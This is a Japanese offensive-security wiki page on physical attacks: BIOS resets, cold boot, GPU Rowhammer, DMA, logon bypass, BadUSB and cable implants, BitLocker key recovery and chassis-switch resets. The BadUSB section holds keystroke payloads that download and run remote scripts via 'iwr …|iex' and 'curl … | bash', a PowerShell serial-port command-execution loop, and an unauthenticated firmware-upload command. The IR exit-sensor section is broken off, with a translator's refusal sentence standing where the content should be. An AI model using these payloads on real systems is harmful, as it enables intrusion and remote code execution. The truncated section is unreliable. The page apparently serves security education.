# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

基板レベルのインターフェースの特定、シリアルコンソール、フラッシュアクセス、サイドチャネル、グリッチングについては、[Hardware Hacking](hardware-hacking/README.md)およびインターフェースごとの章を参照してください。このページでは、システム全体への物理アクセスを必要とする攻撃を扱います。

## BIOS Password Recovery and System Security

旧式のPCファームウェア設定は、CMOSバッテリーを外すか、文書化されたCMOSクリアジャンパーを使うことでリセットできる場合があります。必要な電源オフ時間は基板によって異なります。また、最新のUEFIパスワードやキーは、不揮発性フラッシュ、組み込みコントローラー、セキュリティデバイスに保存されていることがあり、その場合はバッテリーを外しても消去されません。ピンを短絡する前に、基板またはサービスマニュアルを確認してください。この手順によってTPMの測定値が無効になり、ディスク暗号化のリカバリーが必要になる場合もあります。

旧式のx86システムでは、**killCMOS**や**CmosPwd**などのツールを使い、起動可能な環境からCMOSに保存された設定を調べたり変更したりできます。CmosPwdは、文書化された旧式BIOSファミリーのパスワード形式を認識し、CMOSの状態をバックアップ、復元、消去／破棄できます。公開されているビルドは、旧式のDOS/Windows、Linux、FreeBSD、NetBSD環境を対象としています。<sup>[[18]](#references)</sup> これらのユーティリティは汎用のUEFIパスワード解除ツールではなく、十分なハードウェア／ファームウェアへのアクセスが必要です。

一部のノートPCのファームウェアでは、パスワード入力に何度か失敗すると、ベンダー固有のチャレンジコードが表示されます。[bios-pw.org](https://bios-pw.org)などのデータベースは、一部のモデルについて旧式のベンダーリカバリーパスワードを導出できますが、多くのシステムでは、導出可能なチャレンジコードを使わずにロックアウトが実装されています。生成されたパスワードはモデル固有のものとして扱い、永久的な試行回数制限を使い切らないようにしてください。

### UEFI Security

最新の**UEFI**システムでは、CHIPSECを使ってSecure Boot変数の保護を監査できます。まずは以下の変更を加えないチェックを実行してください。オプションの`-a modify`モードは、変数の破損を意図的に試みるため、復旧可能なラボシステムでのみ使用してください。CHIPSEC自身も、特権ドライバーと低レベルのハードウェアアクセスは本番環境のエンドポイントには適さないと警告しています。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analysis と Cold Boot Attacks

DRAMは、リフレッシュが停止しても、すべてのビットが直ちに失われるわけではありません。データの減衰速度はモジュールの技術や温度によって大きく異なり、冷却すれば、電源を切った状態よりもはるかに長く有用なデータを保持できます。Cold-boot attackでは、小規模な取得環境へすばやく再起動するか、冷却したモジュールを移し、rawメモリを取得して、ビットの減衰があっても暗号鍵を復元します。ディスクコピー用ユーティリティが自動的に物理メモリのイメージ取得ツールになるわけではなく、Volatilityは取得ではなくキャプチャの解析を行います。プラットフォームに適合し、検証済みの取得ツールを使用してください。<sup>[[12]](#references)</sup>

---

## ページテーブルを狙う GPU Rowhammer

最新のGPU Rowhammer攻撃は、通常のバッファではなく**GPU仮想メモリのメタデータ**を標的にすると、はるかに実用性が高まります。**GDDR6 NVIDIA Ampere GPU**を対象とした最近の研究では、攻撃者は権限のないCUDAコードを実行してGPU固有のハンマリングパターンを作成し、**memory massaging**を使ってページング構造を脆弱な行に配置し、**最終レベルのページテーブル**または中間の**ページディレクトリ**のビットを反転できます。単一の変換エントリが破損すると、攻撃者は**任意のGPUメモリの読み書き**を実現し、さらにホスト侵害へと進めます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6で**ハンマリング可能な行をプロファイリング**し、DRAM内の緩和策を回避する、リフレッシュを考慮した不均一なハンマリングパターンを作成します。
2. **GPUの割り当てを操作**し、ドライバーがページ変換構造を既定の保護プールに保持せず、ハンマリング可能な物理位置に配置するようにします。実際には、低メモリのページテーブル領域を使い切り、制御されたストライドで大きな疎なUVMマッピングをスプレーする方法があります。
3. ページテーブルまたはページディレクトリエントリ内の**PFN**やアパーチャ関連ビットなどの**変換メタデータを反転**させ、攻撃者が制御する仮想ページをページテーブルページ、任意のGPUメモリ、またはホストから可視なシステムマッピングに解決させます。
4. 偽造したマッピングを再利用して追加の変換エントリを書き換え、GPUコンテキストをまたいだ**任意のGPUメモリの読み書き**へと権限を拡大します。

### ホストへのピボットと緩和策

- **IOMMUが無効**の場合、偽造したシステムアパーチャマッピングによって**ホスト物理メモリ**をGPUに任意に公開でき、GPUのプリミティブからホストを完全に侵害できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**は最終レベルのページテーブルエントリを狙います。一方、**GeForge**は、1ビットの反転でより大きな変換サブツリーの参照先を変更できるため、ページディレクトリのレベルを破損させる方が容易な場合があることを示しています。ページング層の一つだけをセキュリティ上重要と見なさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**は、GDDRHammer/GeForgeが利用するホストメモリへの直接アクセス経路を遮断するため、依然として重要ですが、**完全な緩和策ではありません**。**GPUBreach**は、攻撃者がGPUから書き込み可能なドライバー所有のCPUバッファを破損させ、その後NVIDIAドライバーのメモリ安全性のバグを誘発して、IOMMUが有効な場合でもカーネル書き込みプリミティブと**root shell**を得る、第2段階のピボットを示しています。<sup>[[3]](#references)</sup>
- 対応するワークステーション／サーバーGPUでは、**システムレベルのECC**が実用的な強化策です。ECC非対応のコンシューマー向けGPUでは、防御が弱くなります。<sup>[[4]](#references)</sup>
- これらの攻撃は純粋な理論ではありません。**GeForge**は、RTX 3060で**1,171**回、RTX A6000で**202**回のビット反転を報告しており、ホストの権限昇格チェーンを実現するには十分でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

起動前のIOMMU適用を弱め、Windows DMA攻撃チェーンを可能にするオフラインのUEFI IFR/NVRAMパッチについては、次を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**は、FireWireや初期のThunderbolt構成などのインターフェースを介した**DMAベースのメモリ取得とパッチ適用**を実証しており、過去のログインバイパスの特徴も含まれています。単純に「Windows 10では効果がない」というわけではありません。悪用可能性は、インターフェース、対象ビルド、IOMMUポリシー、ロック状態、Windows Kernel DMA Protectionがサポートされ有効になっているかどうかによって異なります。Windows 10 version 1803以降では、対応プラットフォームでKernel DMA Protectionが導入され、攻撃対象領域が大きく変化しました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## システムアクセス用の Live CD/USB

暗号化されていない、またはすでにロック解除されているWindowsボリュームでは、オフライン環境から**sethc.exe**や**Utilman.exe**などのアクセシビリティ用バイナリを**cmd.exe**に置き換えることで、対応するログオン画面のショートカットを実行した際にSYSTEMのコマンドプロンプトを起動できます。**chntpw**などのツールで、ローカルSAMアカウントのデータを編集できます。これらの手法は、ロックされたBitLockerボリュームをバイパスするものではなく、DPAPI/EFSで保護された認証情報を損傷するおそれがあります。フォレンジック用コピーとバックアップを保全してください。

**Kon-Boot**は、対応するWindows/macOS構成向けの商用ブート時認証バイパスツールです。互換性はOS、ファームウェアモード、Secure Boot、ディスク暗号化の構成によって異なり、BitLockerでロックされたボリュームを復号することはできません。<sup>[[10]](#references)</sup>

---

## Windows Security Featuresへの対処

### ブートおよび回復用ショートカット

- **Delete/Supr**、F2、F10、またはその他のベンダー固有キーで、ファームウェア設定を開ける場合があります。
- **F8**で従来のWindows詳細ブートオプションを開けるのは、その経路が有効な構成に限られます。現在の回復画面への入り方は構成によって異なります。
- **Shift**を押し続けると、一部の構成ではWindowsの自動ログオンを抑止できますが、ポリシーやレジストリ設定でこの動作が無効になっている場合があります。<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky**やTeensyボードなどのデバイスは、信頼されたHIDキーボードとして認識され、定義済みのキー入力を注入できます。ペイロードは、最初はログオン中のセッションと同じ権限およびデスクトップアクセスを持ちます。UACプロンプト、画面ロック、キーボードレイアウト、タイミング、エンドポイントのUSBポリシーによる制約も受けます。<sup>[[15]](#references)</sup>

プログラム可能な周辺機器は、ホストカーネルのパーサーを攻撃したり、複数のUSBデバイスを連携させてヒープ操作や情報漏えいを行ったりすることもできます。

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

管理者権限またはバックアップ権限があれば、シャドウコピーを作成するかレジストリハイブを保存し、**SAM**や**SYSTEM**などのロックされたファイルを取得できます。これは侵害後の収集手法であり、権限バイパスではありません。`diskshadow`/VSSやレジストリハイブのエクスポートに関するイベントと関連付けて調査してください。

## BadUSB / HID Implant Techniques

### NFC-triggered Android HID gadget

root化したAndroid端末をプログラム可能なUSBキーボードにできるのは、USBコントローラーとカーネルが**USB gadget/HID support**を備えている場合に限られます。対応端末では、Kali NetHunterの**USB Arsenal**からgadgetプロファイルを利用できます。別の選択肢として[USB Gadget Tool](https://github.com/tejado/android-usb-gadget)があり、ConfigFS gadget機能を作成し、`/dev/hidg0`や`/dev/hidg1`などのキーボード／マウス用キャラクターデバイスを公開できます。このツールが作成するのはgadgetエンドポイントだけです。HIDレポートをそこに書き込むには、別のプロセスが必要です。rootアクセスがあっても、ConfigFS、HID gadget support、または利用可能なUSB Device Controllerがカーネルにない場合は補えません。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

このエンドポイントは、物理的なトリガーとしてAndroid NFCと組み合わせられます。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)アプリはタグのUIDを読み取り、想定された形式に変換してローカルのホワイトリストと照合し、一致した場合に設定済みのRubber Ducky風のキー入力シーケンスを送信します。接続先のホストには通常のキーボード入力として認識され、NFC用ソフトウェアは必要ありません。<sup>[[22]](#references)[[24]](#references)</sup>

ショートカットやコマンドを使う前に、空のテキストエディターでデバイスの認識とキーボードレイアウトを確認してください。無害なペイロードの例：<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要な信頼境界:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelistは識別であり、認証ではありません**。UIDは公開情報であり、一部のトークン種別やエミュレーターでは複製やなりすましが可能です。許可されたUIDをコピーすると、元のトークンと同じディスパッチ経路をたどります。
- **NfcScreenOff** Magisk moduleはNFC serviceにパッチを適用し、画面がオンでロック解除されているかのように動作させます。スマートフォンがすでにホストに接続されている場合、ロックを解除せずにpayloadを実行できる可能性があります。
- payloadに保存されたパスワード、API token、コマンドは、root化済みまたはbootloaderのロックが解除されたデバイスでは回収可能な秘密情報です。HID経由でパスワードを入力するのは、パスワードレス認証ではなく、再利用可能なパスワードを自動入力する仕組みです。
- HID injectionはアクティブなデスクトップの権限で実行され、フォーカス、タイミング、ホストのキーボード配列に依存します。機密性の高い操作を実行する前に、直近のユーザー確認を必須にし、スクリプトに特権的な秘密情報を含めず、実際の認証には暗号学的なchallenge-response authenticatorを使用してください。

### Wi-Fi管理型ケーブルインプラント

- **Evil Crow Cable Wind**などのESP32-S3ベースのインプラントは、USB-A→USB-CまたはUSB-C↔USB-Cケーブル内部に隠れ、USB keyboardとしてのみ認識され、Wi-Fi経由でC2 stackを公開します。オペレーターは、被害者のホストからケーブルに給電し、パスワード`123456789`のホットスポット`Evil Crow Cable Wind`を作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはそのDHCPアドレス）にアクセスするだけで、組み込みのHTTP interfaceに到達できます。<sup>[[8]](#references)</sup>
- ブラウザーUIには、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config*のタブがあります。保存されたpayloadにはOSごとのタグが付けられ、キーボード配列は実行中に切り替えられ、VID/PID文字列を変更して既知の周辺機器を偽装できます。
- C2がケーブル内部にあるため、スマートフォンでpayloadを準備し、実行を開始し、Wi-Fi credentialsを管理できます。組織のネットワークを使わずに済むため、物理侵入の滞在時間が短い場合に有用です。

### OS対応のAutoExec payload

- AutoExecルールは、USB enumeration直後に1つ以上のpayloadを実行するよう設定します。インプラントは簡易的なOS fingerprintingを行い、一致するスクリプトを選択します。
- ワークフローの例:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 実行は無人で行われるため、充電ケーブルを差し替えるだけで、ログイン中のユーザー権限で「plug-and-pwn」による初期アクセスを達成できます。

### HIDで起動するWi-Fi TCP経由のremote shell

1. **キーストロークによるbootstrap:** 保存されたpayloadがconsoleを開き、新しいUSB serial deviceから受信した内容を実行するループを貼り付けます。Windowsの最小構成の例は次のとおりです:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** implant は USB CDC channel を開いたまま、ESP32-S3 から operator に向けて TCP client（Python script、Android APK、または desktop executable）を起動します。TCP session に入力されたバイト列は、上記の serial loop に転送されるため、air-gapped host でも remote command execution が可能です。出力は限られるため、operator は通常、結果を確認せずに実行するコマンド（アカウント作成、追加ツールの配置など）を使います。

### HTTP OTA update の攻撃対象領域

- Evil Crow Cable Wind の公開ドキュメントに記載された interface では、認証不要の firmware update endpoint `/update` が公開されています。<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operatorは、ケーブルを開けずに作戦中に機能をhot-swap（例: USB Army Knife firmwareをflash）できるため、implantを対象ホストに接続したまま新しい機能へpivotできます。

## BitLocker EncryptionのBypass

稼働中または最近稼働していたシステムを認可を得てforensic acquisitionすると、ボリュームがロック解除されている間に、BitLockerのボリュームマスターキーや関連するキー素材が取得できる場合があります。Elcomsoft Forensic Disk DecryptorやPassware Kit Forensicなどの商用ツールは、対応するメモリイメージ、休止状態ファイル、クラッシュダンプを検索できますが、成功するとは限りません。BitLockerが有効な場合、最新のWindowsではクラッシュダンプも暗号化されます。また、保存された48桁の回復パスワードは、メモリ上のボリュームキーとは別の情報です。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 回復キー追加を狙ったSocial Engineering

攻撃者は、管理者を説得してBitLocker管理コマンドを実行させ、回復パスワード、外部キー、またはその他のprotectorを追加し、それを取得できます。回復パスワードに任意のゼロ文字列を指定することはできません。BitLockerの数値回復パスワードは、検証済みの48桁形式である必要があります。認可された管理で使用する構文は `manage-bde -protectors -add C: -recoverypassword` です。追加されたprotectorは `manage-bde -protectors -get C:` で一覧表示できます。protectorの追加を監視し、新しい回復情報が承認済みの場所にのみ保管されるようにしてください。<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switchを悪用したBIOSのFactory Reset

多くの最新型ノートPCや小型デスクトップには、Embedded Controller（EC）とBIOS/UEFI firmwareが監視する**chassis-intrusion switch**が搭載されています。このswitchは主に、デバイスが開かれた際に警告を発するためのものですが、特定のパターンで切り替えると起動する**非公開のrecovery shortcut**を実装しているvendorもあります。<sup>[[5]](#references)[[6]](#references)</sup>

### Attackの仕組み

1. switchはECの**GPIO interrupt**に接続されています。
2. EC上で動作するfirmwareは、**押下のタイミングと回数**を記録します。
3. ハードコードされたパターンが認識されると、ECは*mainboard-reset*ルーチンを呼び出し、**システムのNVRAM/CMOSの内容を消去**します。
4. 次回の起動時、該当モデルはリセットされたfirmware状態を読み込みます。vendorやrevisionによっては、消去される状態にsupervisor password、カスタムの起動設定、登録済みのSecure Boot keyが含まれることがあります。TPMの状態とディスク暗号化への影響は、別途評価する必要があります。

> firmwareのリセットによって外部メディアからの起動オプションが復元されることはありますが、ストレージが**復号されるわけではありません**。TPM/firmwareの変更後、BitLockerなどのfull-disk encryptionシステムが回復モードに移行しても、回復キーがなければ内蔵ドライブは引き続き保護されます。<sup>[[16]](#references)</sup>

### 実例 – Framework 13 Laptop

Framework 13（第11/12/13世代）のrecovery shortcutは次のとおりです。

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10回目のサイクル後、ECは次回の再起動時にBIOSがNVRAMを消去するよう指示するフラグを設定します。この手順全体にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### 一般的な悪用手順

1. 対象を電源オンにするか、サスペンドから復帰させてECを稼働させる。
2. 底面カバーを外し、侵入検知／メンテナンススイッチを露出させる。
3. ベンダー固有の切り替えパターンを再現する（ドキュメントやフォーラムを確認するか、ECファームウェアをリバースエンジニアリングする）。
4. 再組み立てして再起動し、実際に変更されたファームウェア設定と認証情報を確認する。
5. 許可されており、外部ブートが可能な場合は、管理下のライブイメージから起動する。内部ボリュームが正当にロック解除されている（または暗号化されていなかった）場合、ライブ環境から認証情報やデータを取得したり、EFI System Partitionを調査したりできる。このパーティションを変更してEFI implantをインストールすると、永続的かつ非常に侵襲的な変更となり、Secure Boot、measured boot、ファームウェアの書き込み保護、エンドポイント監視の制約を受ける。暗号化ストレージは、その鍵またはリカバリー情報がなければアクセスできない。

### 検知と緩和策

* OS管理コンソールで筐体侵入イベントを記録し、予期しないBIOSリセットと関連付ける。
* ネジやカバーに**開封検知シール**を貼り、開封を検知する。
* デバイスは**物理的に管理されたエリア**に保管する。物理アクセスは完全な侵害につながると想定する。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効にするか、NVRAMリセットに追加の暗号学的認証を必須にする。

---

## 非接触退出センサーに対する Covert IR Injection

### センサーの特性
- 一般的な「wave-to-exit」センサーは、近赤外線LEDエミッターとテレビのリモコンに似た受信モジュールを組み合わせたもので、正しい搬送波（約30 kHz）のパルスを複数回（約4～10回）検出した後にのみ、ロジックHighを出力する。<sup>[[7]](#references)</sup>
申し訳ありませんが、アクセス制御を欺いてドアを解錠する具体的な手順の翻訳には協力できません。防御や安全対策に焦点を当てた要約ならお手伝いできます。

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
